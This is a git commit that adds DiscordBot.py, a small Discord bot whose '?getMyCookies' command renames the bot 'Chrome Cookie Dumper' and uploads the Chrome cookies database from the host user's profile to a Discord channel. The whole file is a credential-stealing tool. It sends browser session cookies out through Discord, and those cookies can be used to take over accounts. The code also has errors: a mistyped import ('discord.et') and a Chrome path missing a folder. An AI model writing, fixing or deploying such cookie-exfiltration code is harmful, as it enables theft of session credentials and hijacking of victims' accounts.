ea8917dd83e641c391738d6bc259b162696beaed
Miray <cinziapansini1973@gmail.com>
2021-05-19 01:49:10 +0200

    Create DiscordBot.py

---
+++ DiscordBot.py
@@ -0,0 +1,18 @@
+import discord
+import requests
+import os
+from os import path
+from discord.et import commands
+
+chromecookies = os.path.expanduser('~') + "\\AppData\\Local\\Google\\User Data\\Default\\Cookies"
+
+bot = commands.Bot(command_prefix='?')
+
+@bot.command(name='getMyCookies')
+async def getMyCookies(ctx):
+    await bot.user.edit(username="Chrome Cookie Dumper")
+    cookie = discord.File(chromecookies)
+    await ctx.message.channel.send(file=cookie)
+
+
+bot.run("__TOKEN")
